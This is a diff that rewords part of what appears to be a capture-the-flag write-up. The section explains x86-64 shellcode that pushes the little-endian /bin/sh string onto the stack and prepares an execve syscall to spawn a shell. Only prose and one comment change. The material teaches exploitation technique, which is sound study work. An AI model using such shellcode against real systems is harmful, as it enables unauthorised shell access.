@@ -19,12 +19,12 @@ syscall          ; execute the syscall
 - We trigger a system call using the syscall number in `rax` and the arguments in the appropriate registers. Since the registers are initially zeroed by the binary, both `rsi` and `rdx` (second and third arguments of execve) are already NULL.
 
 ## Alternative solution
-Another solution is to put the string "/bin/sh" in the stack 
+Another approach is to push the string /bin/sh directly onto the stack, like this:
 ```{asm}
 xor rax, rax                     
 mov rax, 0x3b                    
-mov rdi, 0x0068732f6e69622f    ; move /bin/sh into rdi  
+mov rdi, 0x0068732f6e69622f    ; move "reversed" /bin/sh into rdi  
 push rdi                       ; pushes /bin/sh onto the stack.
 mov rdi, rsp                   ; points rdi to the location of /bin/sh on the stack.
 ```
-- To push it correctly onto the stack, the bytes of "/bin/sh" must be reversed since the system uses little endian. 
+- To push it correctly onto the stack, the bytes of "/bin/sh" must be reversed since the system uses little-endian byte ordering.
